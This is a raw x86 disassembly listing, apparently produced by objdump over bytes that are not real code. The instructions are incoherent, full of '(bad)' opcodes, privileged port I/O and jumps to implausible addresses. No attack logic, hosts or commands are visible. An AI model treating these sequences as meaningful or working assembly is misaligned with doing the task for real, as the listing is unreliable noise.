  422c52:	sub    eax,0x4a140dbf
  422c57:	daa    
  422c58:	xlat   BYTE PTR gs:[ebx]
  422c5a:	shl    BYTE PTR [esi-0x15],cl
  422c5d:	push   ecx
  422c5e:	pop    edx
  422c5f:	lea    ebx,[eax]
  422c61:	call   0x6ff8fabf
  422c66:	scas   al,BYTE PTR es:[edi]
  422c67:	xchg   edx,eax
  422c68:	xchg   edx,eax
  422c69:	fwait
  422c6a:	mov    al,ds:0x8b946a99
  422c6f:	sub    edi,ebx
  422c71:	out    0x8a,eax
  422c73:	cmc    
  422c74:	fnstsw WORD PTR [ebp+0x5102fd41]
  422c7a:	(bad)  
  422c7b:	sub    DWORD PTR [edi],ebp
  422c7d:	jns    0x422c4b
  422c7f:	cdq    
  422c80:	mov    esp,0x3c89604e
  422c85:	cs mov edx,0x3fe45f98
  422c8b:	inc    esp
  422c8c:	cmc    
  422c8d:	ins    BYTE PTR es:[edi],dx
  422c8e:	xchg   ecx,eax
  422c8f:	mov    bl,0x13
  422c91:	imul   ebx,DWORD PTR [edx-0x6770047],0x332b0140
  422c9b:	sub    al,0xc5
  422c9d:	sub    al,0x78
  422c9f:	or     edx,esp
  422ca1:	cwde   
  422ca2:	adc    dl,bh
  422ca4:	in     al,0x16
  422ca6:	js     0x422c91
  422ca8:	and    BYTE PTR [ebx-0x6fb5f48f],dl
  422cae:	jmp    0x4010166c
  422cb3:	inc    ebp
  422cb4:	adc    dl,BYTE PTR [edi+0x52a7d6d3]
  422cba:	sbb    DWORD PTR [esi+0x2e2249f6],eax
  422cc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422cc1:	in     al,0x3f
  422cc3:	pop    ecx
  422cc4:	sub    al,0xaa
  422cc6:	cmc    
  422cc7:	dec    esp
  422cc8:	test   DWORD PTR [eax+0x7e],0xd78b7dfc
  422ccf:	rol    DWORD PTR [edi-0x3fc59a65],cl
  422cd5:	cmp    cl,BYTE PTR [esi+0xe7bffcc]
  422cdb:	sub    dh,BYTE PTR [ebx+0x5da738d6]
  422ce1:	rcl    eax,1
  422ce3:	adc    ebx,DWORD PTR [ebx+0x18c43679]
  422ce9:	retf   
  422cea:	mov    bl,0x73
  422cec:	out    dx,al
  422ced:	mov    ds:0x4fc3a4c,eax
  422cf2:	lahf   
  422cf3:	push   ss
  422cf4:	scas   eax,DWORD PTR es:[edi]
  422cf5:	hlt    
  422cf6:	imul   ebx,DWORD PTR ds:0xab745254,0x11
  422cfd:	jmp    0x422cd8
  422cff:	int3   
  422d00:	gs aas 
  422d02:	bound  ebp,QWORD PTR [eax-0x3e]
  422d05:	test   BYTE PTR [ecx+0x5089041c],cl
  422d0b:	stc    
  422d0c:	pusha  
  422d0d:	outs   dx,BYTE PTR ds:[esi]
  422d0e:	mov    ds:0x5d3f3d34,eax
  422d13:	inc    edx
  422d14:	leave  
  422d15:	idiv   DWORD PTR [edi]
  422d17:	push   es
  422d18:	daa    
  422d19:	cmp    al,0x3b
  422d1b:	or     ah,BYTE PTR [ebx]
  422d1d:	sub    al,0x3c
  422d1f:	aas    
  422d20:	xchg   BYTE PTR [edi+0x54],cl
  422d23:	push   ebp
  422d24:	repz push edx
  422d26:	popa   
  422d27:	nop
  422d28:	dec    esi
  422d29:	(bad)  
  422d2a:	outs   dx,BYTE PTR ds:[esi]
  422d2b:	repz mov esp,0x36af1b1e
  422d31:	push   0xffffffa0
  422d33:	mov    esp,0x86dce887
  422d38:	cmp    DWORD PTR [esi+0x7a],ebx
  422d3b:	in     eax,dx
  422d3c:	sub    eax,0x16993c2a
	...
  422db1:	add    BYTE PTR [eax],al
  422db3:	add    bh,cl
  422db5:	mov    eax,ds:0xbf7f851b
  422dba:	fucomip st,st(3)
  422dbc:	addr16 mov ecx,0x4f0af9f7
  422dc2:	mov    al,ds:0x17425c2
  422dc7:	add    ch,dh
  422dc9:	add    BYTE PTR [eax],al
  422dcb:	add    BYTE PTR [ebx+eiz*8],al
  422dce:	xchg   ebp,eax
  422dcf:	int    0xe4
  422dd1:	jo     0x422d82
  422dd3:	(bad)  
  422dd4:	jge    0x422e24
  422dd6:	jbe    0x422dc6
  422dd8:	cmp    eax,0x36b30a85
  422ddd:	inc    eax
  422dde:	push   0x3c
  422de0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422de1:	les    esi,FWORD PTR [eax]
  422de3:	or     dh,BYTE PTR [edx]
  422de5:	or     cl,dl
  422de7:	xchg   ebp,eax
  422de8:	js     0x422d87
  422dea:	fstp   QWORD PTR [ebp+0x6a]
  422ded:	mov    al,ds:0xfe92a44a
  422df2:	sbb    dh,cl
  422df4:	xchg   ebp,eax
  422df5:	mov    eax,ds:0x33749115
  422dfa:	bndldx (bad),[esi+ebp*2-0x3ffeeb6e]
  422e02:	mov    eax,ds:0x5e99a838
  422e07:	jnp    0x422deb
  422e09:	js     0x422ddb
  422e0b:	(bad)  
  422e0c:	test   eax,0x8058b827
  422e11:	xchg   DWORD PTR [ebx+0x17],esp
  422e14:	jle    0x422da2
  422e16:	mov    ebp,0xf0f28bf2
  422e1b:	rcr    ah,0x62
  422e1e:	mov    eax,?
  422e20:	sub    eax,0xfdf55a2c
  422e25:	hlt    
  422e26:	lahf   
  422e27:	(bad)  [esp+eiz*8+0x5997db29]
  422e2e:	fwait
  422e2f:	mov    WORD PTR [eax+0xd],gs
  422e32:	in     al,dx
  422e33:	popf   
  422e34:	je     0x422e53
  422e36:	mov    cl,0x9b
  422e38:	inc    esp
  422e39:	cld    
  422e3a:	ja     0x422eb4
  422e3c:	jnp    0x422df3
  422e3e:	shl    BYTE PTR [ebx-0x291ff871],1
  422e44:	push   esp
  422e45:	jo     0x422e02
  422e47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e48:	clc    
  422e49:	pusha  
  422e4a:	cmp    eax,0xe8b5e34b
  422e4f:	repnz std 
  422e51:	sbb    DWORD PTR [eax],esi
  422e53:	test   BYTE PTR [ecx+esi*4+0x47],cl
  422e57:	jmp    0x5d59542c
  422e5c:	adc    DWORD PTR [edx],ebx
  422e5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e5f:	inc    ebp
  422e60:	xor    ecx,DWORD PTR [ebx-0x46e7c431]
  422e66:	push   edx
  422e67:	push   ds
  422e68:	and    esp,DWORD PTR [eax]
  422e6a:	retf   0xf782
  422e6d:	mov    eax,ds:0xd48813e5
  422e72:	or     eax,0x3be038f3
  422e77:	mov    ds:0xe1c64f23,al
  422e7c:	pop    eax
  422e7d:	jae    0x422e55
  422e7f:	in     eax,dx
  422e80:	aaa    
  422e81:	mov    bl,0x2b
  422e83:	push   ebx
  422e84:	jno    0x422ec5
  422e86:	xchg   edx,eax
  422e87:	cld    
  422e88:	sub    DWORD PTR ds:0x8de22d85,esi
  422e8e:	shl    BYTE PTR [edx-0x640a05a1],cl
  422e94:	xchg   edx,eax
  422e95:	into   
  422e96:	dec    ebx
  422e97:	inc    BYTE PTR [ebp+0x74]
  422e9a:	aam    0xa3
  422e9c:	xchg   esp,eax
  422e9d:	dec    edi
  422e9e:	lock clc 
  422ea0:	fbld   TBYTE PTR ds:0x844ce56c
  422ea6:	mov    bl,0xbe
  422ea8:	call   0x47c05cdf
  422ead:	cdq    
  422eae:	jno    0x422e87
  422eb0:	loopne 0x422e66
  422eb2:	xor    BYTE PTR [esi],0xd2
  422eb5:	call   FWORD PTR [edi+ebp*2]
  422eb8:	fnstcw WORD PTR [esi+esi*1+0x48a40ec4]
  422ebf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ec0:	nop
	...
  422f31:	add    BYTE PTR [eax],al
  422f33:	add    BYTE PTR [ebx+0x6],ch
  422f36:	(bad)  
  422f37:	dec    edi
  422f38:	out    dx,eax
  422f39:	iret   
  422f3a:	jmp    0x422f62
  422f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f3d:	addr16 fs add bh,cl
  422f41:	std    
  422f42:	mov    bh,0x9d
  422f44:	sbb    dh,BYTE PTR [ebp+0x1]
  422f47:	add    ch,dh
  422f49:	add    BYTE PTR [eax],al
  422f4b:	add    cl,bl
  422f4d:	iret   
  422f4e:	mov    ecx,0x56306351
  422f53:	and    eax,0xc2024ce4
  422f58:	jle    0x422f5c
  422f5a:	inc    ecx
  422f5b:	and    eax,0xa8c4b6cd
  422f60:	cmp    edx,DWORD PTR [esp+esi*8-0x908889e]
  422f67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f68:	ds repnz inc eax
  422f6b:	pop    esp
  422f6c:	in     eax,0x58
  422f6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f6f:	xchg   esp,ebx
  422f71:	mov    eax,0xb12cf20e
  422f76:	adc    al,0x65
  422f78:	add    ch,BYTE PTR [ebp-0x180caf00]
  422f7e:	mov    bl,bh
  422f80:	inc    esi
  422f81:	jg     0x422fdb
  422f83:	dec    edi
  422f84:	cmc    
  422f85:	outs   dx,BYTE PTR ds:[esi]
  422f86:	fnop   
  422f88:	and    ebx,0x5a
  422f8b:	out    0x54,eax
  422f8d:	nop
  422f8e:	aad    0xd9
  422f90:	mov    bh,0x21
  422f92:	loop   0x422f50
  422f94:	rol    BYTE PTR [esi-0x67a723f0],1
  422f9a:	lods   al,BYTE PTR ds:[esi]
  422f9b:	add    al,0xde
  422f9d:	sub    dl,BYTE PTR [ecx]
  422f9f:	arpl   WORD PTR [esi-0x4ea7112],si
  422fa5:	jle    0x422fa1
  422fa7:	push   ebx
  422fa8:	fisub  DWORD PTR [ebx+0x75e9d031]
  422faf:	and    eax,0x39146599
  422fb4:	cld    
  422fb5:	adc    dl,BYTE PTR [edx]
  422fb7:	and    edx,DWORD PTR [eax+0x4d]
  422fba:	popa   
  422fbb:	mov    WORD PTR [eax-0x42df4c59],es
  422fc1:	cmp    eax,edi
  422fc3:	inc    edx
  422fc4:	js     0x422fd4
  422fc6:	mov    ch,0xf3
  422fc8:	xchg   esi,eax
  422fc9:	jle    0x422fa7
  422fcb:	pusha  
  422fcc:	sbb    DWORD PTR [ebx+eax*2+0x412cff7c],esp
  422fd3:	sbb    dh,BYTE PTR [esi]
  422fd5:	imul   ebx,DWORD PTR [esi],0xffffffcd
  422fd8:	aad    0xd4
  422fda:	or     DWORD PTR [edx+0x33d0c06c],0x4d
  422fe1:	sar    bh,cl
  422fe3:	push   ss
  422fe4:	adc    BYTE PTR [eax-0x1fadca04],ch
  422fea:	sub    eax,edx
  422fec:	xchg   BYTE PTR [edi-0x3],ch
  422fef:	test   DWORD PTR [esi+0x2c],ecx
  422ff2:	mov    al,ds:0x98a187f8
  422ff7:	ja     0x42304e
  422ff9:	mov    esi,0x56a621da
  422ffe:	call   0x833af160
  423003:	sti    
  423004:	adc    BYTE PTR [ecx-0x6f],bh
  423007:	arpl   WORD PTR [edx+0x1f],dx
  42300a:	into   
  42300b:	sub    eax,0xe8695dab
  423010:	and    BYTE PTR [esi-0x14],dh
  423013:	shl    BYTE PTR [ebx*2-0x46c1244f],1
  42301a:	fsubr  DWORD PTR [eax]
  42301c:	push   edx
  42301d:	pop    es
  42301e:	inc    ecx
  42301f:	sbb    DWORD PTR [ebx],edx
  423021:	and    BYTE PTR [edi],ah
  423023:	and    DWORD PTR [eax+ebx*2],edx
  423026:	dec    ebx
  423027:	push   ecx
  423028:	scas   eax,DWORD PTR es:[edi]
  423029:	add    DWORD PTR [edi+0x35590e75],edi
  42302f:	(bad)  
  423030:	fidivr DWORD PTR [ebx-0x5aaa42aa]
  423036:	ret    0xc49b
  423039:	adc    eax,0x37a856a8
  42303e:	mov    esi,0xe857
	...
  4230b3:	add    BYTE PTR [esi-0x284ae],ah
  4230b9:	std    
  4230ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230bb:	pop    ebx
  4230bc:	lods   eax,DWORD PTR ds:[esi]
  4230bd:	jne    0x423121
  4230bf:	xchg   ecx,eax
  4230c0:	mov    ebx,0xfc25010
  4230c5:	jbe    0x4230c8
  4230c7:	add    ch,dh
  4230c9:	add    BYTE PTR [eax],al
  4230cb:	add    BYTE PTR [ecx],al
  4230cd:	out    dx,eax
  4230ce:	(bad)  
  4230cf:	lock and DWORD PTR [eax-0x505db770],esi
  4230d6:	and    ecx,esp
  4230d8:	mov    eax,ds:0xf14a4143
  4230dd:	pop    ebx
  4230de:	lods   eax,DWORD PTR ds:[esi]
  4230df:	es ret 0xa957
  4230e3:	clc    
  4230e4:	in     eax,0x5e
  4230e6:	out    dx,al
  4230e7:	jp     0x423079
  4230e9:	pop    ds
  4230ea:	test   al,0x3b
  4230ec:	ret    0x1476
  4230ef:	mov    esp,0xa6144bf4
  4230f4:	inc    edx
  4230f5:	sbb    al,0x33
  4230f7:	jge    0x4230d1
  4230f9:	mov    esp,0xe2e72010
  4230fe:	mov    WORD PTR [ebx],fs
  423100:	cs ins BYTE PTR es:[edi],dx
  423102:	cmp    esi,DWORD PTR [ebx]
  423104:	dec    ebp
  423105:	xchg   esp,eax
  423106:	jb     0x423180
  423108:	inc    edx
  423109:	in     al,dx
  42310a:	adc    bh,BYTE PTR [ecx]
  42310c:	mov    al,0xd7
  42310e:	jg     0x423105
  423110:	push   esi
  423111:	or     BYTE PTR [ecx],bh
  423113:	aas    
  423114:	inc    ebx
  423115:	dec    eax
  423116:	push   cs
  423117:	mov    cl,0x7c
  423119:	repz out 0x19,eax
  42311c:	mov    esp,0x516f1375
  423121:	fiadd  DWORD PTR [eax+ecx*1-0x76b1fdee]
  423128:	loopne 0x42314f
  42312a:	inc    ebx
  42312b:	jbe    0x42316c
  42312d:	xlat   BYTE PTR ds:[ebx]
  42312e:	(bad)  
  42312f:	and    bl,dl
  423131:	cli    
  423132:	adc    eax,esi
  423134:	push   edi
  423135:	into   
  423136:	pop    edi
  423137:	mov    ebp,0xdb1eff3
  42313c:	pop    eax
  42313d:	mov    dl,BYTE PTR [ecx+0x6e]
  423140:	xor    eax,0xe65c9696
  423145:	push   ebx
  423146:	sbb    al,0xad
  423148:	adc    al,ah
  42314a:	jno    0x4230d1
  42314c:	das    
  42314d:	retf   0xfb3e
  423150:	mov    cl,BYTE PTR [ebx]
  423152:	rcr    DWORD PTR [ebx+0x47],0x6a
  423156:	ds call 0x232ab88
  42315c:	dec    ebx
  42315d:	cmp    edi,ebx
  42315f:	rol    DWORD PTR [ecx],cl
  423161:	fnstcw WORD PTR [eax*1-0x53995576]
  423168:	test   al,0x67
  42316a:	std    
  42316b:	loope  0x42317a
  42316d:	data16 mov dl,0xb6
  423170:	jp     0x423135
  423172:	shr    BYTE PTR [ecx],cl
  423174:	lahf   
  423175:	lods   eax,DWORD PTR ds:[esi]
  423176:	xchg   edi,eax
  423177:	lds    esi,FWORD PTR [ebx]
  423179:	add    BYTE PTR [edi-0x51e2d726],0x14
  423180:	cmp    bh,BYTE PTR [esp+ebx*2-0x76e905b4]
  423187:	ja     0x4231c2
  423189:	out    0xdd,al
  42318b:	gs test eax,0xa978e599
  423191:	rcl    DWORD PTR [esi+0x6a],1
  423194:	int3   
  423195:	ret    
  423196:	ficomp DWORD PTR [edx+eax*1]
  423199:	and    ebx,ebp
  42319b:	mov    ecx,0x145348e8
  4231a0:	mov    al,0xce
  4231a2:	or     edi,esp
  4231a4:	and    eax,0x1b02d55a
  4231a9:	lods   eax,DWORD PTR ds:[esi]
  4231aa:	xchg   edi,eax
  4231ab:	pop    esi
  4231ac:	loopne 0x42314a
  4231ae:	in     al,dx
  4231af:	stc    
  4231b0:	fidivr WORD PTR [edx]
  4231b2:	mov    edx,0xf4717486
  4231b7:	mov    edi,0x928dee74
  4231bc:	mov    ecx,0x78d91e0a
	...
  423231:	add    BYTE PTR [eax],al
  423233:	add    BYTE PTR [edi-0x10085213],cl
  423239:	neg    edi
  42323b:	std    
  42323c:	stc    
  42323d:	idiv   DWORD PTR ds:0x6ef4eeb0
  423243:	das    
  423244:	add    al,0x77
  423246:	add    DWORD PTR [eax],eax
  423248:	cmc    
  423249:	add    BYTE PTR [eax],al
  42324b:	add    ah,al
  42324d:	jmp    DWORD PTR [edi+0x13c57dfc]
  423253:	mov    ch,0xaf
  423255:	or     cl,dh
  423257:	aam    0x3e
  423259:	push   edx
  42325a:	jae    0x423214
  42325c:	jno    0x4232b8
  42325e:	fnstsw WORD PTR [edx-0x80]
  423261:	sub    esi,DWORD PTR [edx+0x7db89490]
  423267:	test   BYTE PTR [esi],0x29
  42326a:	(bad)  
  42326b:	sahf   
  42326c:	pusha  
  42326d:	sub    al,0x8f
  42326f:	sbb    bh,BYTE PTR [eax]
  423271:	mov    bl,0x3d
  423273:	loop   0x42321d
  423275:	add    eax,0x1a1b84c9
  42327a:	pop    es
  42327b:	inc    esp
  42327c:	or     eax,0xe31aacde
  423281:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423282:	(bad)  
  423283:	jmp    0xf337df5e
  423288:	fmul   DWORD PTR [ebx+0x4a]
  42328b:	inc    edi
  42328c:	push   edi
  42328d:	push   ss
  42328e:	cli    
  42328f:	mov    ds:0xfb3c2af1,al
  423294:	dec    edi
  423295:	(bad)  [edx]
  423297:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423298:	mov    ebx,0xe37c7552
  42329d:	push   ds
  42329e:	mov    BYTE PTR [ecx-0x22],bh
  4232a1:	push   ecx
  4232a2:	retf   0xcd1c
  4232a5:	xchg   edi,eax
  4232a6:	pop    edx
  4232a7:	and    eax,0x9d99c019
  4232ac:	aaa    
  4232ad:	imul   esp,esi,0xe
  4232b0:	push   cs
  4232b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232b2:	sbb    DWORD PTR [esp+ebp*8],0x69
  4232b6:	mov    ch,0xf8
  4232b8:	adc    al,0x83
  4232ba:	into   
  4232bb:	out    0x97,eax
  4232bd:	xchg   esi,eax
  4232be:	pop    edi
  4232bf:	call   0xfb33:0x2e721514
  4232c6:	fsubr  QWORD PTR [edx+0x27]
  4232c9:	and    al,BYTE PTR ds:0x99a2b7db
  4232cf:	sub    al,0x54
  4232d1:	dec    esp
  4232d2:	fs aas 
  4232d4:	add    esi,DWORD PTR [eax+ecx*2]
  4232d7:	(bad)  
  4232d8:	inc    ebx
  4232d9:	bnd jne 0x423265
  4232dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232dd:	retf   
  4232de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232df:	mov    bl,BYTE PTR [ecx+eiz*2]
  4232e2:	imul   bp
  4232e5:	push   edx
  4232e6:	pop    ebx
  4232e7:	(bad)  
  4232e8:	cmp    bl,dh
  4232ea:	lds    esi,FWORD PTR [edi]
  4232ec:	mov    ds:0x6d2daff6,eax
  4232f1:	push   esp
  4232f2:	push   edx
  4232f3:	jne    0x4232bd
  4232f5:	lds    ecx,FWORD PTR [ecx]
  4232f7:	and    DWORD PTR [esi],esp
  4232f9:	dec    edi
  4232fa:	dec    ebx
  4232fb:	jae    0x4232c1
  4232fd:	pushf  
  4232fe:	les    ecx,FWORD PTR [edx-0x51]
  423301:	retf   0xa610
  423304:	stos   DWORD PTR es:[edi],eax
  423305:	and    eax,0x10f21c5c
  42330a:	les    eax,FWORD PTR [ebp-0x9]
  42330d:	in     al,dx
  42330e:	call   0x4e2d:0x5aff0d3b
  423315:	in     eax,0xbd
  423317:	pop    ss
  423318:	cmp    DWORD PTR [ecx],ebx
  42331a:	push   esi
  42331b:	cwde   
  42331c:	inc    ebx
  42331d:	add    ebx,DWORD PTR [edx]
  42331f:	push   eax
  423320:	retf   0x6ca8
  423323:	aad    0xbb
  423325:	xchg   esp,eax
  423326:	pop    esi
  423327:	scas   al,BYTE PTR es:[edi]
  423328:	pop    esp
  423329:	add    DWORD PTR [esi+0x66],ebx
  42332c:	or     al,0x7e
  42332e:	retf   0x47ca
  423331:	xchg   ebp,eax
  423332:	cdq    
  423333:	imul   esi,DWORD PTR [eax+eax*2+0x147430dc],0x31
  42333b:	pop    edi
  42333c:	sub    ah,cl
  42333e:	neg    BYTE PTR [ecx+0x45]
	...
  4233b1:	add    BYTE PTR [eax],al
  4233b3:	add    BYTE PTR [edx-0x7e],dl
  4233b6:	cs imul edi,esi,0x4bb57ed
  4233bd:	mov    eax,ds:0x4c448e4a
  4233c2:	(bad)  
  4233c3:	jmp    0xf5:0x177f9
  4233ca:	add    BYTE PTR [eax],al
  4233cc:	xchg   edx,eax
  4233cd:	test   al,0x21
  4233cf:	cmp    al,cl
  4233d1:	mov    ds:0x5a9fba1e,al
  4233d6:	or     eax,0x3f058b53
  4233db:	in     eax,dx
  4233dc:	pop    edx
  4233dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233de:	jp     0x423426
  4233e0:	mov    bh,0x9d
  4233e2:	sti    
  4233e3:	mov    dh,0x9e
  4233e5:	ds pop esp
  4233e7:	bound  edx,QWORD PTR [edx+eiz*8+0x4af150e1]
  4233ee:	retf   0x9634
  4233f1:	adc    ebx,DWORD PTR [ebx-0x3d]
  4233f4:	or     BYTE PTR [esi+0x77],cl
  4233f7:	sub    ecx,eax
  4233f9:	jg     0x4233fb
  4233fb:	cld    
  4233fc:	in     eax,dx
  4233fd:	jno    0x423391
  4233ff:	out    dx,al
  423400:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423401:	ds daa 
  423403:	rcl    DWORD PTR [ebx+0x45],1
  423406:	push   es
  423407:	pop    esi
  423408:	and    esi,DWORD PTR [edi+0x44]
  42340b:	int    0xc8
  42340d:	push   esp
  42340e:	push   esp
  42340f:	fs ret 0x6ffc
  423413:	jmp    0xb841:0x1b275fdb
  42341a:	lods   eax,DWORD PTR ds:[esi]
  42341b:	cs out dx,eax
  42341d:	stc    
  42341e:	fld    TBYTE PTR [edx]
  423420:	adc    eax,0x6dc2267a
  423425:	xor    al,0x5c
  423427:	mov    edx,0xe1f16ee3
  42342c:	mov    eax,0x561b492
  423431:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423432:	jg     0x42342f
  423434:	push   ds
  423435:	push   edi
  423436:	call   0xdb6b5cdc
  42343b:	bound  edi,QWORD PTR [eax-0x4f]
  42343e:	mov    edi,0x5549de4e
  423443:	mov    esp,DWORD PTR [esi]
  423445:	dec    ebp
  423446:	lea    ecx,[esi-0x4147d8a9]
  42344c:	(bad)
  423451:	sub    bl,BYTE PTR [edi-0x682034fd]
  423457:	test   DWORD PTR [edi-0x7a0aa35f],ecx
  42345d:	loope  0x42341f
  42345f:	xchg   edi,eax
  423460:	pop    edx
  423461:	repnz cmp DWORD PTR [edi-0x25],esi
  423465:	or     BYTE PTR [ebx],dl
  423467:	xchg   edx,eax
  423468:	pop    edx
  423469:	add    al,0xcd
  42346b:	sbb    BYTE PTR [ecx+0x2],dl
  42346e:	pop    ecx
  423470:	call   0x55bf:0x4b227d4f
  423477:	outs   dx,BYTE PTR ds:[esi]
  423478:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423479:	and    BYTE PTR [edi],al
  42347b:	jne    0x423435
  42347d:	sbb    al,0x9
  42347f:	xchg   edi,eax
  423480:	sub    cl,BYTE PTR [eax+0x7]
  423483:	add    BYTE PTR [eax+edx*8+0x4d482e06],0x97
  42348b:	pop    ebp
  42348c:	adc    ecx,DWORD PTR [eax]
  42348e:	nop
  42348f:	inc    esp
  423490:	out    0x41,eax
  423492:	xor    DWORD PTR [ebx+0xfe6596f],eax
  423498:	enter  0xfed8,0x2d
  42349c:	xor    BYTE PTR [ecx+0x65],ch
  42349f:	(bad)  
  4234a0:	popa   
  4234a1:	jbe    0x4234e5
  4234a3:	jmp    0x4234a1
  4234a5:	scas   eax,DWORD PTR es:[edi]
  4234a6:	jle    0x4234c0
  4234a8:	rcr    bh,0xe9
  4234ab:	cwde   
  4234ac:	or     dl,BYTE PTR [ebp-0x386641a4]
  4234b2:	nop
  4234b3:	retf   
  4234b4:	fs mov dh,0x4
  4234b7:	call   0x7895365f
  4234bc:	mov    ebp,0x6c229acf
	...
  423531:	add    BYTE PTR [eax],al
  423533:	add    BYTE PTR [edx-0x40887052],bl
  423539:	ja     0x423535
  42353b:	out    dx,eax
  42353c:	dec    ebx
  42353d:	jg     0x4234d2
  42353f:	aad    0x4a
  423541:	enter  0x978f,0xee
  423545:	js     0x423548
  423547:	add    ch,dh
  423549:	add    BYTE PTR [eax],al
  42354b:	add    BYTE PTR [esi],dh
  42354d:	xchg   edi,eax
  42354e:	jecxz  0x42355c
  423550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423551:	in     eax,dx
  423552:	jp     0x423517
  423554:	inc    esi
  423555:	mov    fs,WORD PTR [esi]
  423557:	sub    ebp,eax
  423559:	test   BYTE PTR [esi],bl
  42355b:	adc    eax,0xa6e48e4d
  423560:	xlat   BYTE PTR ds:[ebx]
  423561:	imul   ebx,DWORD PTR [eax],0xbf3f08ba
  423567:	in     al,0x56
  423569:	pop    es
  42356a:	pop    edi
  42356b:	dec    esi
  42356c:	loopne 0x423548
  42356e:	pop    ebp
  42356f:	sbb    esp,DWORD PTR [eax+ebx*2-0x7ca35e41]
  423576:	call   FWORD PTR [esi+ebx*8+0x45635e0a]
  42357d:	nop
  42357e:	jp     0x423519
  423580:	xchg   esp,eax
  423581:	rol    BYTE PTR [edi-0x1a],1
  423584:	(bad)  
  423585:	adc    al,0xbc
  423587:	lahf   
  423588:	dec    edx
  423589:	scas   al,BYTE PTR es:[edi]
  42358a:	lods   eax,DWORD PTR ds:[esi]
  42358b:	mov    dh,0x5a
  42358d:	(bad)  
  42358e:	lods   eax,DWORD PTR ds:[esi]
  42358f:	pop    ecx
  423590:	sub    al,BYTE PTR [eax+ecx*8]
  423593:	jl     0x4235a6
  423595:	pop    ds
  423596:	sbb    BYTE PTR [eax+0x6988e576],bh
  42359c:	push   ebx
  42359d:	add    al,0x8a
  42359f:	xchg   esp,eax
  4235a0:	scas   eax,DWORD PTR es:[edi]
  4235a1:	ins    BYTE PTR es:[edi],dx
  4235a2:	xor    al,0x33
  4235a4:	mov    bl,0xc0
  4235a6:	call   0x6b69:0xeec82c71
  4235ad:	jmp    0x352dfac9
  4235b2:	fild   WORD PTR [edi]
  4235b4:	cmp    al,0x57
  4235b6:	sbb    al,0x16
  4235b8:	xor    DWORD PTR [edx-0x50198e59],eax
  4235be:	int3   
  4235bf:	clc    
  4235c0:	push   cs
  4235c1:	ja     0x42355d
  4235c3:	xor    BYTE PTR [edi-0x7f58168d],dl
  4235c9:	add    edx,DWORD PTR [eax]
  4235cb:	mov    DWORD PTR [edi],0xca2edba3
  4235d1:	sub    ebx,DWORD PTR ds:0x69f34164
  4235d7:	mov    ebp,0x7ced06e0
  4235dc:	sahf   
  4235dd:	mov    dl,0xcb
  4235df:	pop    edx
  4235e0:	jno    0x42363a
  4235e2:	mov    BYTE PTR [ebx+0x2c],0x2a
  4235e6:	mov    ebx,0x9039ba9c
  4235eb:	jno    0x4235a7
  4235ed:	fadd   QWORD PTR [edx]
  4235ef:	push   edi
  4235f0:	jl     0x423612
  4235f2:	mov    dh,0x5b
  4235f4:	shl    DWORD PTR [ebx+0x4e],cl
  4235f7:	jb     0x4235b2
  4235f9:	jns    0x42362c
  4235fb:	imul   esp,eax,0x9841244b
  423601:	imul   edi,ebx,0xffffffa3
  423604:	mov    DWORD PTR [ebp+ebx*4-0x56e96099],eax
  42360b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42360c:	loop   0x423597
  42360e:	data16 lods al,BYTE PTR ds:[esi]
  423610:	mov    eax,0xb1902b4e
  423615:	and    eax,0x5c3c1496
  42361a:	stc    
  42361b:	int    0x53
  42361d:	inc    ebx
  42361e:	test   dh,ch
  423620:	sahf   
  423621:	mov    ecx,DWORD PTR ds:0x57665605
  423627:	adc    ch,bl
  423629:	or     eax,0xa011248b
  42362e:	and    DWORD PTR [edi-0x4b9afbda],ebx
  423634:	push   esp
  423635:	or     ecx,ecx
  423637:	dec    edx
  423638:	test   BYTE PTR [ecx+edi*4],al
  42363b:	adc    eax,DWORD PTR [eax]
  42363d:	and    ecx,ebp
  42363f:	aaa    
  423640:	std    
	...
  4236b1:	add    BYTE PTR [eax],al
  4236b3:	add    BYTE PTR [edi],ah
  4236b5:	sub    eax,0x7d7f2d7d
  4236ba:	ja     0x4236eb
  4236bc:	mov    cl,ah
  4236be:	paddq  mm7,QWORD PTR [ecx-0x1ce3e31c]
  4236c5:	jns    0x4236c8
  4236c7:	add    ch,dh
  4236c9:	add    BYTE PTR [eax],al
  4236cb:	add    BYTE PTR [ecx-0x7b363fa4],ch
  4236d1:	retf   
  4236d2:	pop    esp
  4236d3:	scas   eax,DWORD PTR es:[edi]
  4236d4:	(bad)  
  4236d5:	push   ecx
  4236d6:	adc    ebx,ebx
  4236d8:	mov    ecx,0xb1509cef
  4236dd:	ja     0x4236ab
  4236df:	push   0x4b0ebe
  4236e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236e5:	sbb    eax,0xfea88bae
  4236ea:	sbb    eax,0x6c3122d2
  4236ef:	or     BYTE PTR ds:0xc8f92e3e,dl
  4236f5:	sbb    al,BYTE PTR [edx+0x7c]
  4236f8:	dec    edi
  4236f9:	xor    BYTE PTR [esi],0xa
  4236fc:	jle    0x4236c1
  4236fe:	xor    eax,0x736c8974
  423703:	adc    al,0xd5
  423705:	stos   DWORD PTR es:[edi],eax
  423706:	add    ebx,ecx
  423708:	xlat   BYTE PTR ds:[ebx]
  423709:	popa   
  42370a:	sbb    esp,DWORD PTR [ecx+0xb466f6e]
  423710:	sbb    esi,DWORD PTR [edi-0x5326b230]
